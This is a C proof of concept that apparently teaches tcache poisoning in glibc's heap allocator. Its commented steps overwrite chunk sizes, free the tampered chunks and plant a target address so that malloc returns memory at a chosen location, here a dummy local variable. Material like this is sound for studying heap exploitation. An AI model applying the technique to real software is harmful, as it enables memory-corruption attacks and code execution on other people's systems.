#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define LARGE 0x6f0
#define SMALL 0x308

int main(void)
{
    // our dummy target. We want to allocate a chunk at the address of `var`
    size_t var;

    // first allocate our reference block. In the real application we use this one to write / read the others
    void *r = malloc(LARGE);

    // setup some chunks, eventually we will be using a1 and a3 to setup the exploit, the others are "padding"
    void *a0 = malloc(LARGE);
    void *a1 = malloc(LARGE);
    void *a2 = malloc(LARGE);
    void *a3 = malloc(LARGE);
    void *a4 = malloc(LARGE);

    printf("r %p\n", r);
    printf("a0 %p\n", a0);
    printf("--> a1 %p\n", a1);
    printf("a2 %p\n", a2);
    printf("--> a3 %p\n", a3);
    printf("a4 %p\n", a4);

    // We free a0 because we are required to leak libc base address.
    // This is not done here but we can find the address at a0 after freeing this chunk
    free(a0);

    // Overwrite the sizes of a1 and a3 to fit into the tcache
    // also note that we set the P (previous in use) bits for each of them
    *(size_t*)(r + 2*(LARGE + 8) + 8) = SMALL + 8 | 1;
    *(size_t*)(r + 4*(LARGE + 8) + 24) = SMALL + 8 | 1;

    // freeing the tampered chunks will put them in the tcache
    free(a1);
    free(a3);

    // we can now place our target address in the second one
    // this is all it takes, no additional setup needed as this version of tcache does
    // not perform additional security checks
    *(size_t*)a3 = &var;

    void *junk = malloc(SMALL);
    void *target = malloc(SMALL);

    // finally our target chunk is located at &var
    printf("target @ %p\n", target);

    return 0;
}
